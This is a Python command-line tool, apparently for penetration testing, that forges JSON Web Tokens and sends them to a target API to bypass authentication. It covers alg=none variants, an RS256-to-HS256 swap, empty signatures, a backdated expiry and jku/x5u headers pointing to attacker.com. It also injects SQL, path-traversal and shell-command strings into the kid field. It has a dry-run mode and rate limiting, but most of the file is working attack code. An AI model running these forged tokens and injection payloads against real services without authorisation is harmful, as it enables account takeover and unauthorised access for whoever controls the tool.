#!/usr/bin/env python3
"""
jwt_scanner.py — JWT vulnerability scanner.

Tests for none-algorithm bypass, alg-swap (RS256→HS256), kid injection,
jku/x5u spoofing, expired token acceptance, and missing signature validation.

Usage:
  python3 tools/jwt_scanner.py --url https://api.example.com/me --token eyJ...
  python3 tools/jwt_scanner.py --url https://api.example.com/me --token eyJ... --dry-run
  python3 tools/jwt_scanner.py --url https://api.example.com/me --token eyJ... --rate 0.5 --json
"""

import argparse
import base64
import json
import sys
import time
import urllib.request
import urllib.error

# ─── Color codes ──────────────────────────────────────────────────────────────
RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BLUE   = "\033[94m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

FINDINGS = []


# ─── JWT Helpers ──────────────────────────────────────────────────────────────

def b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def parse_jwt(token: str) -> tuple[dict, dict, str] | None:
    """Decode JWT header, payload, and signature (no validation)."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header  = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return None


def forge_token(header: dict, payload: dict, signature: str = "") -> str:
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{signature}"


# ─── HTTP Helpers ─────────────────────────────────────────────────────────────

def http_get(url: str, token: str, timeout: int = 10) -> tuple[int, str]:
    req = urllib.request.Request(
        url,
        headers={
            "Authorization": f"Bearer {token}",
            "Cookie": f"token={token}",
            "User-Agent": "Mozilla/5.0",
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except Exception as e:
        return 0, str(e)


def record(test: str, result: str, detail: str, severity: str = "HIGH"):
    FINDINGS.append({"test": test, "result": result, "detail": detail, "severity": severity})
    color = RED if result == "VULNERABLE" else (YELLOW if result == "INTERESTING" else GREEN)
    print(f"  {color}[{result}]{RESET} {test}")
    if detail:
        print(f"    {DIM}{detail}{RESET}")


# ─── Test Cases ───────────────────────────────────────────────────────────────

def test_none_algorithm(url: str, header: dict, payload: dict, rate: float, dry_run: bool):
    print(f"\n{BOLD}[1] None Algorithm Bypass{RESET}")
    for alg_val in ["none", "None", "NONE", "nOnE"]:
        h = {**header, "alg": alg_val}
        forged = forge_token(h, payload, "")
        print(f"  {DIM}Forged: {forged[:80]}...{RESET}")
        if dry_run:
            print(f"  {CYAN}[DRY-RUN]{RESET} Would send Bearer {forged[:40]}...")
            continue
        time.sleep(1.0 / rate)
        status, body = http_get(url, forged)
        if status in (200, 201):
            record("none-alg", "VULNERABLE", f"alg={alg_val!r} → HTTP {status}")
        else:
            record("none-alg", "BLOCKED", f"alg={alg_val!r} → HTTP {status}")


def test_alg_swap(url: str, header: dict, payload: dict, original_token: str,
                   rate: float, dry_run: bool):
    print(f"\n{BOLD}[2] Algorithm Swap (RS256 → HS256){RESET}")
    orig_alg = header.get("alg", "")
    if orig_alg not in ("RS256", "RS384", "RS512", "ES256", "ES384", "ES512"):
        print(f"  {DIM}Token uses {orig_alg!r} — alg-swap less likely applicable{RESET}")

    # Re-sign with HS256 using the empty string as key (just removes sig)
    h = {**header, "alg": "HS256"}
    forged = forge_token(h, payload, "fakesig")
    if dry_run:
        print(f"  {CYAN}[DRY-RUN]{RESET} Would send HS256 token: {forged[:60]}...")
        return
    time.sleep(1.0 / rate)
    status, body = http_get(url, forged)
    if status in (200, 201):
        record("alg-swap-hs256", "VULNERABLE", f"RS256→HS256 → HTTP {status}")
    else:
        record("alg-swap-hs256", "BLOCKED", f"RS256→HS256 → HTTP {status}")


def test_kid_injection(url: str, header: dict, payload: dict, rate: float, dry_run: bool):
    print(f"\n{BOLD}[3] kid Injection{RESET}")
    kid_payloads = [
        ("sqli", "' OR 1=1--"),
        ("sqli-union", "' UNION SELECT 'key'--"),
        ("path-traversal", "../../dev/null"),
        ("path-traversal-win", "../../windows/win.ini"),
        ("cmd-injection", "/dev/null; ls /"),
        ("null-byte", "\x00"),
    ]
    for name, kid_val in kid_payloads:
        h = {**header, "kid": kid_val}
        forged = forge_token(h, payload, "sig")
        if dry_run:
            print(f"  {CYAN}[DRY-RUN]{RESET} kid={kid_val!r} → {forged[:60]}...")
            continue
        time.sleep(1.0 / rate)
        status, body = http_get(url, forged)
        marker = "VULNERABLE" if status in (200, 201) else "BLOCKED"
        record(f"kid-{name}", marker, f"kid={kid_val!r} → HTTP {status}")


def test_jku_x5u(url: str, header: dict, payload: dict, rate: float, dry_run: bool):
    print(f"\n{BOLD}[4] jku / x5u Spoofing{RESET}")
    spoofed_urls = [
        "https://attacker.com/.well-known/jwks.json",
        "https://attacker.com/jwks",
    ]
    for param in ("jku", "x5u"):
        for spoof_url in spoofed_urls:
            h = {**header, param: spoof_url}
            forged = forge_token(h, payload, "sig")
            if dry_run:
                print(f"  {CYAN}[DRY-RUN]{RESET} {param}={spoof_url} → {forged[:60]}...")
                continue
            time.sleep(1.0 / rate)
            status, body = http_get(url, forged)
            marker = "INTERESTING" if status in (200, 201) else "BLOCKED"
            record(f"{param}-spoof", marker, f"{param}={spoof_url} → HTTP {status}")


def test_expired_token(url: str, header: dict, payload: dict, original_token: str,
                        rate: float, dry_run: bool):
    print(f"\n{BOLD}[5] Expired Token Acceptance{RESET}")
    import calendar
    modified = {**payload, "exp": 1000000000}  # epoch 2001 — definitely expired
    forged = forge_token(header, modified, "originalsig")
    if dry_run:
        print(f"  {CYAN}[DRY-RUN]{RESET} Would send token with exp=1000000000 (2001)")
        return
    time.sleep(1.0 / rate)
    status, body = http_get(url, forged)
    if status in (200, 201):
        record("expired-token", "VULNERABLE", f"exp=2001 accepted → HTTP {status}")
    else:
        record("expired-token", "BLOCKED", f"exp=2001 rejected → HTTP {status}")


def test_missing_signature(url: str, header: dict, payload: dict, rate: float, dry_run: bool):
    print(f"\n{BOLD}[6] Missing / Empty Signature{RESET}")
    for sig in ("", ".", "AAAA"):
        forged = forge_token(header, payload, sig)
        if dry_run:
            print(f"  {CYAN}[DRY-RUN]{RESET} sig={sig!r} → {forged[:60]}...")
            continue
        time.sleep(1.0 / rate)
        status, body = http_get(url, forged)
        marker = "VULNERABLE" if status in (200, 201) else "BLOCKED"
        record(f"no-sig-{repr(sig)}", marker, f"sig={sig!r} → HTTP {status}")


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="JWT vulnerability scanner")
    parser.add_argument("--url",      required=True, help="Target endpoint URL")
    parser.add_argument("--token",    required=True, help="JWT token to test")
    parser.add_argument("--rate",     type=float, default=1.0, metavar="REQ/S",
                        help="Request rate limit in req/sec (default: 1.0)")
    parser.add_argument("--dry-run",  action="store_true",
                        help="Show what would be tested without sending requests")
    parser.add_argument("--json",     action="store_true", dest="json_output",
                        help="Output results as JSON")
    args = parser.parse_args()

    print(f"\n{BOLD}{BLUE}╔══════════════════════════════════════╗")
    print(f"║         JWT Scanner                  ║")
    print(f"╚══════════════════════════════════════╝{RESET}")
    print(f"  Target : {CYAN}{args.url}{RESET}")
    print(f"  Rate   : {args.rate} req/sec")
    if args.dry_run:
        print(f"  Mode   : {YELLOW}DRY-RUN (no requests sent){RESET}")

    parsed = parse_jwt(args.token)
    if not parsed:
        print(f"{RED}[ERROR]{RESET} Could not parse JWT — not a valid 3-part token")
        sys.exit(1)

    header, payload, sig = parsed
    print(f"\n{BOLD}JWT Header:{RESET}  {json.dumps(header)}")
    print(f"{BOLD}JWT Payload:{RESET} {json.dumps(payload)}")
    if "exp" in payload:
        remaining = payload["exp"] - time.time()
        state = f"{GREEN}valid{RESET}" if remaining > 0 else f"{RED}EXPIRED{RESET}"
        print(f"{BOLD}Expiry:{RESET}      {state} ({int(abs(remaining))}s {'remaining' if remaining > 0 else 'ago'})")

    test_none_algorithm(args.url, header, payload, args.rate, args.dry_run)
    test_alg_swap(args.url, header, payload, args.token, args.rate, args.dry_run)
    test_kid_injection(args.url, header, payload, args.rate, args.dry_run)
    test_jku_x5u(args.url, header, payload, args.rate, args.dry_run)
    test_expired_token(args.url, header, payload, args.token, args.rate, args.dry_run)
    test_missing_signature(args.url, header, payload, args.rate, args.dry_run)

    vulns = [f for f in FINDINGS if f["result"] == "VULNERABLE"]
    print(f"\n{BOLD}{'─'*50}{RESET}")
    print(f"  Tests run : {len(FINDINGS)}")
    print(f"  {RED}Vulnerable: {len(vulns)}{RESET}" if vulns else f"  {GREEN}Vulnerable: 0{RESET}")

    if args.json_output:
        print(json.dumps({"url": args.url, "findings": FINDINGS}, indent=2))


if __name__ == "__main__":
    main()
